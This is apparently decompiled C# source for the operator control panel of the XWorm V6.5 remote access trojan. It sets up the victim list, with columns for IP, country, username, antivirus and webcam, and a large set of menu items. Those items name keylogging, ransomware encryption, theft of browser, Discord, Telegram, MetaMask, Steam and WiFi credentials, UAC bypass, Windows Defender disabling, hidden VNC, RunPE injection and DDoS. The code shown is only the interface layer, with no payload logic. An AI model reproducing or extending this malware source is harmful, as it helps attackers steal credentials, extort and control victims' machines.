namespace XWorm
{
	// Token: 0x02000016 RID: 22
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class Main : global::System.Windows.Forms.Form
	{
		// Token: 0x060002AC RID: 684 RVA: 0x000194D4 File Offset: 0x000176D4
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x060002AD RID: 685 RVA: 0x00019524 File Offset: 0x00017724
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::XWorm.Main));
			this.StatusStrip1 = new global::System.Windows.Forms.StatusStrip();
			this.ToolStripStatusLabel1 = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.Timer_Ping = new global::System.Windows.Forms.Timer(this.components);
			this.Timer_Status = new global::System.Windows.Forms.Timer(this.components);
			this.NotifyIcon1 = new global::System.Windows.Forms.NotifyIcon(this.components);
			this.Guna2ContextMenuStrip5 = new global::Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.ShowToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RestartToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ExitToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.performanceCounter2 = new global::System.Diagnostics.PerformanceCounter();
			this.performanceCounter1 = new global::System.Diagnostics.PerformanceCounter();
			this.ii = new global::System.Windows.Forms.ImageList(this.components);
			this.TimerTask = new global::System.Windows.Forms.Timer(this.components);
			this.ThumbnailCap = new global::System.Windows.Forms.Timer(this.components);
			this.ImageList1 = new global::System.Windows.Forms.ImageList(this.components);
			this.Lv4 = new global::System.Windows.Forms.ListView();
			this.Guna2ContextMenuStrip4 = new global::Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.ToolStripMenuItem4 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ToolStripMenuItem6 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ImageList2 = new global::System.Windows.Forms.ImageList(this.components);
			this.Guna2Panel2 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.Guna2TextBox1 = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.Guna2Panel3 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.Guna2Panel4 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.Guna2Panel6 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.Guna2Button7 = new global::Guna.UI2.WinForms.Guna2Button();
			this.Guna2Button6 = new global::Guna.UI2.WinForms.Guna2Button();
			this.Guna2Button5 = new global::Guna.UI2.WinForms.Guna2Button();
			this.Guna2Button4 = new global::Guna.UI2.WinForms.Guna2Button();
			this.Guna2Button3 = new global::Guna.UI2.WinForms.Guna2Button();
			this.Guna2Button2 = new global::Guna.UI2.WinForms.Guna2Button();
			this.Guna2Button1 = new global::Guna.UI2.WinForms.Guna2Button();
			this.Guna2ContextMenuStrip2 = new global::Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.ToolStripMenuItem7 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.Guna2ContextMenuStrip1 = new global::Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.FromDiskToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FromLinkToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FromMemoryToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.OpenUrlToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.VisibleToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.InvisibleToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.KeyloggerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.WDExclusionToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RecoveryToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.V20AutoToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RunRecoveryToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ChromiumToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DiscordTokenToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MetaMaskToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.TelegramSessionToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UpdateAllClientsToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RemoveTaskToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.Guna2ContextMenuStrip3 = new global::Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.InformationToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MonitorToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RunFileToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DiskToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.LinkToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MemoryToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RunPEToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.WebCamToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MicrophoneToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SystemSoundToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.OpenUrlToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.VisibleToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.InvisibleToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.OptionsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.BlankScreenToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.EnableToolStripMenuItem6 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableToolStripMenuItem6 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RegeditToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.EnableToolStripMenuItem8 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableToolStripMenuItem8 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FirewallToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.EnableToolStripMenuItem10 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableToolStripMenuItem10 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.TaskMgrToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.EnableToolStripMenuItem9 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableToolStripMenuItem9 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UACToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.EnableToolStripMenuItem7 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableToolStripMenuItem7 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UpdateToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.EnableToolStripMenuItem11 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableToolStripMenuItem11 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ResetScaleToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.InvokeBSODToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DeleteRestoreToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.Net35InstallToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UninstallPluginsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ShellToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.KitToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FileManagerToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RecoveryOptionsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.V20TwoToolStripMenuItem3 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RunRecoveryToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SteamTokennToolStripMenuItem3 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ChromiumToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DiscordTokenToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.TelegramSessionToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ProductKeyToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MetaMaskToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FileZillaToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.WifiKeysToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RegistryEditorToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ActiveWindowsToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.TCPConnectionsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.StartupManagerToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ProcessManagerToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ServiceManagerToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ClipboardManagerToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.InstalledProgramsToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.VBNetCompilerToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DDosAttackToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.LocationManagerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.PastimeToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.PowerToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ShutdownToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RestartToolStripMenuItem4 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.LogoffToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableUACToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.Extra1ToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ReportWindowToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.StartToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.StopToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.VoiceChatToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.PerformanceToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.EditHostsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.KeyLoggerToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.OfflineToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.OnlineToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ClientChatToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FilesSearcherToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UACBypassToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RunAsToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.CommandsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MessageBoxToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.Extra2ToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RansomwareToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.EncryptToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DecryptToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ReverseProxyToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.HiddenBrowserToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.HiddenVNCToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RunPEToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MemoryToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.HiddenAppsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.BotkillerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.WDKillerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.WDDisableToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.WDExclusionToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ClientToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RestartToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.CloseToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UninstallToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UpdateToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.NoteToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ClientFolderToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.Guna2Panel1 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.Guna2Panel5 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.Guna2NotificationPaint1 = new global::Guna.UI2.WinForms.Guna2NotificationPaint(this.components);
			this.Guna2HtmlToolTip1 = new global::Guna.UI2.WinForms.Guna2HtmlToolTip();
			this.PowerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.Lv1 = new global::XWorm.LV();
			this._IP = new global::System.Windows.Forms.ColumnHeader();
			this._Country = new global::System.Windows.Forms.ColumnHeader();
			this._ID = new global::System.Windows.Forms.ColumnHeader();
			this._Username = new global::System.Windows.Forms.ColumnHeader();
			this._Operating = new global::System.Windows.Forms.ColumnHeader();
			this._Group = new global::System.Windows.Forms.ColumnHeader();
			this._Date = new global::System.Windows.Forms.ColumnHeader();
			this._USB = new global::System.Windows.Forms.ColumnHeader();
			this._UAC = new global::System.Windows.Forms.ColumnHeader();
			this._Cam = new global::System.Windows.Forms.ColumnHeader();
			this._CPU = new global::System.Windows.Forms.ColumnHeader();
			this._GPU = new global::System.Windows.Forms.ColumnHeader();
			this._Ram = new global::System.Windows.Forms.ColumnHeader();
			this._Antivirus = new global::System.Windows.Forms.ColumnHeader();
			this._Note = new global::System.Windows.Forms.ColumnHeader();
			this._idle = new global::System.Windows.Forms.ColumnHeader();
			this._Ping = new global::System.Windows.Forms.ColumnHeader();
			this._ActiveWindow = new global::System.Windows.Forms.ColumnHeader();
			this.Lv2 = new global::XWorm.LV();
			this.ColumnHeader16 = new global::System.Windows.Forms.ColumnHeader();
			this.ColumnHeader17 = new global::System.Windows.Forms.ColumnHeader();
			this.Lv3 = new global::XWorm.LV();
			this.ColumnHeader12 = new global::System.Windows.Forms.ColumnHeader();
			this.ColumnHeader13 = new global::System.Windows.Forms.ColumnHeader();
			this.StatusStrip1.SuspendLayout();
			this.Guna2ContextMenuStrip5.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter2).BeginInit();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter1).BeginInit();
			this.Guna2ContextMenuStrip4.SuspendLayout();
			this.Guna2Panel2.SuspendLayout();
			this.Guna2Panel6.SuspendLayout();
			this.Guna2ContextMenuStrip2.SuspendLayout();
			this.Guna2ContextMenuStrip1.SuspendLayout();
			this.Guna2ContextMenuStrip3.SuspendLayout();
			base.SuspendLayout();
			this.StatusStrip1.BackColor = global::System.Drawing.Color.White;
			this.StatusStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ToolStripStatusLabel1
			});
			this.StatusStrip1.Location = new global::System.Drawing.Point(0, 423);
			this.StatusStrip1.Name = "StatusStrip1";
			this.StatusStrip1.Padding = new global::System.Windows.Forms.Padding(1, 0, 9, 0);
			this.StatusStrip1.Size = new global::System.Drawing.Size(915, 22);
			this.StatusStrip1.TabIndex = 2;
			this.StatusStrip1.Text = "StatusStrip1";
			this.ToolStripStatusLabel1.ForeColor = global::System.Drawing.Color.Black;
			this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
			this.ToolStripStatusLabel1.Size = new global::System.Drawing.Size(13, 17);
			this.ToolStripStatusLabel1.Text = "..";
			this.Timer_Ping.Enabled = true;
			this.Timer_Ping.Interval = 30000;
			this.Timer_Status.Interval = 500;
			this.NotifyIcon1.ContextMenuStrip = this.Guna2ContextMenuStrip5;
			this.NotifyIcon1.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("NotifyIcon1.Icon");
			this.NotifyIcon1.Text = "XWorm V6.5";
			this.NotifyIcon1.Visible = true;
			this.Guna2ContextMenuStrip5.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ShowToolStripMenuItem,
				this.RestartToolStripMenuItem1,
				this.ExitToolStripMenuItem
			});
			this.Guna2ContextMenuStrip5.Name = "Guna2ContextMenuStrip2";
			this.Guna2ContextMenuStrip5.RenderStyle.ArrowColor = global::System.Drawing.Color.FromArgb(151, 143, 255);
			this.Guna2ContextMenuStrip5.RenderStyle.BorderColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip5.RenderStyle.ColorTable = null;
			this.Guna2ContextMenuStrip5.RenderStyle.RoundedEdges = true;
			this.Guna2ContextMenuStrip5.RenderStyle.SelectionArrowColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip5.RenderStyle.SelectionBackColor = global::System.Drawing.Color.FromArgb(113, 74, 250);
			this.Guna2ContextMenuStrip5.RenderStyle.SelectionForeColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip5.RenderStyle.SeparatorColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip5.RenderStyle.TextRenderingHint = global::System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
			this.Guna2ContextMenuStrip5.Size = new global::System.Drawing.Size(111, 70);
			this.ShowToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.ShowToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ShowToolStripMenuItem.Image");
			this.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem";
			this.ShowToolStripMenuItem.Size = new global::System.Drawing.Size(110, 22);
			this.ShowToolStripMenuItem.Text = "Show";
			this.RestartToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.RestartToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RestartToolStripMenuItem1.Image");
			this.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1";
			this.RestartToolStripMenuItem1.Size = new global::System.Drawing.Size(110, 22);
			this.RestartToolStripMenuItem1.Text = "Restart";
			this.ExitToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.ExitToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ExitToolStripMenuItem.Image");
			this.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem";
			this.ExitToolStripMenuItem.Size = new global::System.Drawing.Size(110, 22);
			this.ExitToolStripMenuItem.Text = "Exit";
			this.performanceCounter2.CategoryName = "Memory";
			this.performanceCounter2.CounterName = "% Committed Bytes In Use";
			this.performanceCounter1.CategoryName = "Processor";
			this.performanceCounter1.CounterName = "% Processor Time";
			this.performanceCounter1.InstanceName = "_Total";
			this.ii.ImageStream = (global::System.Windows.Forms.ImageListStreamer)componentResourceManager.GetObject("ii.ImageStream");
			this.ii.TransparentColor = global::System.Drawing.Color.Transparent;
			this.ii.Images.SetKeyName(0, "--.png");
			this.ii.Images.SetKeyName(1, "AD.png");
			this.ii.Images.SetKeyName(2, "AE.png");
			this.ii.Images.SetKeyName(3, "AF.png");
			this.ii.Images.SetKeyName(4, "AG.png");
			this.ii.Images.SetKeyName(5, "AI.png");
			this.ii.Images.SetKeyName(6, "AL.png");
			this.ii.Images.SetKeyName(7, "AM.png");
			this.ii.Images.SetKeyName(8, "AN.png");
			this.ii.Images.SetKeyName(9, "AO.png");
			this.ii.Images.SetKeyName(10, "AQ.png");
			this.ii.Images.SetKeyName(11, "AR.png");
			this.ii.Images.SetKeyName(12, "AS.png");
			this.ii.Images.SetKeyName(13, "AT.png");
			this.ii.Images.SetKeyName(14, "AU.png");
			this.ii.Images.SetKeyName(15, "AW.png");
			this.ii.Images.SetKeyName(16, "AX.png");
			this.ii.Images.SetKeyName(17, "AZ.png");
			this.ii.Images.SetKeyName(18, "BA.png");
			this.ii.Images.SetKeyName(19, "BB.png");
			this.ii.Images.SetKeyName(20, "BD.png");
			this.ii.Images.SetKeyName(21, "BE.png");
			this.ii.Images.SetKeyName(22, "BF.png");
			this.ii.Images.SetKeyName(23, "BG.png");
			this.ii.Images.SetKeyName(24, "BH.png");
			this.ii.Images.SetKeyName(25, "BI.png");
			this.ii.Images.SetKeyName(26, "BJ.png");
			this.ii.Images.SetKeyName(27, "BL.png");
			this.ii.Images.SetKeyName(28, "BM.png");
			this.ii.Images.SetKeyName(29, "BN.png");
			this.ii.Images.SetKeyName(30, "BO.png");
			this.ii.Images.SetKeyName(31, "BR.png");
			this.ii.Images.SetKeyName(32, "BS.png");
			this.ii.Images.SetKeyName(33, "BT.png");
			this.ii.Images.SetKeyName(34, "BW.png");
			this.ii.Images.SetKeyName(35, "BY.png");
			this.ii.Images.SetKeyName(36, "BZ.png");
			this.ii.Images.SetKeyName(37, "CA.png");
			this.ii.Images.SetKeyName(38, "CC.png");
			this.ii.Images.SetKeyName(39, "CD.png");
			this.ii.Images.SetKeyName(40, "CF.png");
			this.ii.Images.SetKeyName(41, "CG.png");
			this.ii.Images.SetKeyName(42, "CH.png");
			this.ii.Images.SetKeyName(43, "CI.png");
			this.ii.Images.SetKeyName(44, "CK.png");
			this.ii.Images.SetKeyName(45, "CL.png");
			this.ii.Images.SetKeyName(46, "CM.png");
			this.ii.Images.SetKeyName(47, "CN.png");
			this.ii.Images.SetKeyName(48, "CO.png");
			this.ii.Images.SetKeyName(49, "CR.png");
			this.ii.Images.SetKeyName(50, "CU.png");
			this.ii.Images.SetKeyName(51, "CV.png");
			this.ii.Images.SetKeyName(52, "CW.png");
			this.ii.Images.SetKeyName(53, "CX.png");
			this.ii.Images.SetKeyName(54, "CY.png");
			this.ii.Images.SetKeyName(55, "CZ.png");
			this.ii.Images.SetKeyName(56, "DE.png");
			this.ii.Images.SetKeyName(57, "DJ.png");
			this.ii.Images.SetKeyName(58, "DK.png");
			this.ii.Images.SetKeyName(59, "DM.png");
			this.ii.Images.SetKeyName(60, "DO.png");
			this.ii.Images.SetKeyName(61, "DZ.png");
			this.ii.Images.SetKeyName(62, "EC.png");
			this.ii.Images.SetKeyName(63, "EE.png");
			this.ii.Images.SetKeyName(64, "EG.png");
			this.ii.Images.SetKeyName(65, "EH.png");
			this.ii.Images.SetKeyName(66, "ER.png");
			this.ii.Images.SetKeyName(67, "ES.png");
			this.ii.Images.SetKeyName(68, "ET.png");
			this.ii.Images.SetKeyName(69, "EU.png");
			this.ii.Images.SetKeyName(70, "FI.png");
			this.ii.Images.SetKeyName(71, "FJ.png");
			this.ii.Images.SetKeyName(72, "FK.png");
			this.ii.Images.SetKeyName(73, "FM.png");
			this.ii.Images.SetKeyName(74, "FO.png");
			this.ii.Images.SetKeyName(75, "FR.png");
			this.ii.Images.SetKeyName(76, "GA.png");
			this.ii.Images.SetKeyName(77, "GB.png");
			this.ii.Images.SetKeyName(78, "GD.png");
			this.ii.Images.SetKeyName(79, "GE.png");
			this.ii.Images.SetKeyName(80, "GG.png");
			this.ii.Images.SetKeyName(81, "GH.png");
			this.ii.Images.SetKeyName(82, "GI.png");
			this.ii.Images.SetKeyName(83, "GL.png");
			this.ii.Images.SetKeyName(84, "GM.png");
			this.ii.Images.SetKeyName(85, "GN.png");
			this.ii.Images.SetKeyName(86, "GQ.png");
			this.ii.Images.SetKeyName(87, "GR.png");
			this.ii.Images.SetKeyName(88, "GS.png");
			this.ii.Images.SetKeyName(89, "GT.png");
			this.ii.Images.SetKeyName(90, "GU.png");
			this.ii.Images.SetKeyName(91, "GW.png");
			this.ii.Images.SetKeyName(92, "GY.png");
			this.ii.Images.SetKeyName(93, "HK.png");
			this.ii.Images.SetKeyName(94, "HN.png");
			this.ii.Images.SetKeyName(95, "HR.png");
			this.ii.Images.SetKeyName(96, "HT.png");
			this.ii.Images.SetKeyName(97, "HU.png");
			this.ii.Images.SetKeyName(98, "IC.png");
			this.ii.Images.SetKeyName(99, "ID.png");
			this.ii.Images.SetKeyName(100, "IE.png");
			this.ii.Images.SetKeyName(101, "IL.png");
			this.ii.Images.SetKeyName(102, "IM.png");
			this.ii.Images.SetKeyName(103, "IN.png");
			this.ii.Images.SetKeyName(104, "IQ.png");
			this.ii.Images.SetKeyName(105, "IR.png");
			this.ii.Images.SetKeyName(106, "IS.png");
			this.ii.Images.SetKeyName(107, "IT.png");
			this.ii.Images.SetKeyName(108, "JE.png");
			this.ii.Images.SetKeyName(109, "JM.png");
			this.ii.Images.SetKeyName(110, "JO.png");
			this.ii.Images.SetKeyName(111, "JP.png");
			this.ii.Images.SetKeyName(112, "KE.png");
			this.ii.Images.SetKeyName(113, "KG.png");
			this.ii.Images.SetKeyName(114, "KH.png");
			this.ii.Images.SetKeyName(115, "KI.png");
			this.ii.Images.SetKeyName(116, "KM.png");
			this.ii.Images.SetKeyName(117, "KN.png");
			this.ii.Images.SetKeyName(118, "KP.png");
			this.ii.Images.SetKeyName(119, "KR.png");
			this.ii.Images.SetKeyName(120, "KW.png");
			this.ii.Images.SetKeyName(121, "KY.png");
			this.ii.Images.SetKeyName(122, "KZ.png");
			this.ii.Images.SetKeyName(123, "LA.png");
			this.ii.Images.SetKeyName(124, "LB.png");
			this.ii.Images.SetKeyName(125, "LC.png");
			this.ii.Images.SetKeyName(126, "LI.png");
			this.ii.Images.SetKeyName(127, "LK.png");
			this.ii.Images.SetKeyName(128, "LR.png");
			this.ii.Images.SetKeyName(129, "LS.png");
			this.ii.Images.SetKeyName(130, "LT.png");
			this.ii.Images.SetKeyName(131, "LU.png");
			this.ii.Images.SetKeyName(132, "LV.png");
			this.ii.Images.SetKeyName(133, "LY.png");
			this.ii.Images.SetKeyName(134, "MA.png");
			this.ii.Images.SetKeyName(135, "MC.png");
			this.ii.Images.SetKeyName(136, "MD.png");
			this.ii.Images.SetKeyName(137, "ME.png");
			this.ii.Images.SetKeyName(138, "MF.png");
			this.ii.Images.SetKeyName(139, "MG.png");
			this.ii.Images.SetKeyName(140, "MH.png");
			this.ii.Images.SetKeyName(141, "MK.png");
			this.ii.Images.SetKeyName(142, "ML.png");
			this.ii.Images.SetKeyName(143, "MM.png");
			this.ii.Images.SetKeyName(144, "MN.png");
			this.ii.Images.SetKeyName(145, "MO.png");
			this.ii.Images.SetKeyName(146, "MP.png");
			this.ii.Images.SetKeyName(147, "MQ.png");
			this.ii.Images.SetKeyName(148, "MR.png");
			this.ii.Images.SetKeyName(149, "MS.png");
			this.ii.Images.SetKeyName(150, "MT.png");
			this.ii.Images.SetKeyName(151, "MU.png");
			this.ii.Images.SetKeyName(152, "MV.png");
			this.ii.Images.SetKeyName(153, "MW.png");
			this.ii.Images.SetKeyName(154, "MX.png");
			this.ii.Images.SetKeyName(155, "MY.png");
			this.ii.Images.SetKeyName(156, "MZ.png");
			this.ii.Images.SetKeyName(157, "NA.png");
			this.ii.Images.SetKeyName(158, "NC.png");
			this.ii.Images.SetKeyName(159, "NE.png");
			this.ii.Images.SetKeyName(160, "NF.png");
			this.ii.Images.SetKeyName(161, "NG.png");
			this.ii.Images.SetKeyName(162, "NI.png");
			this.ii.Images.SetKeyName(163, "NL.png");
			this.ii.Images.SetKeyName(164, "NO.png");
			this.ii.Images.SetKeyName(165, "NP.png");
			this.ii.Images.SetKeyName(166, "NR.png");
			this.ii.Images.SetKeyName(167, "NU.png");
			this.ii.Images.SetKeyName(168, "NZ.png");
			this.ii.Images.SetKeyName(169, "OM.png");
			this.ii.Images.SetKeyName(170, "PA.png");
			this.ii.Images.SetKeyName(171, "PE.png");
			this.ii.Images.SetKeyName(172, "PF.png");
			this.ii.Images.SetKeyName(173, "PG.png");
			this.ii.Images.SetKeyName(174, "PH.png");
			this.ii.Images.SetKeyName(175, "PK.png");
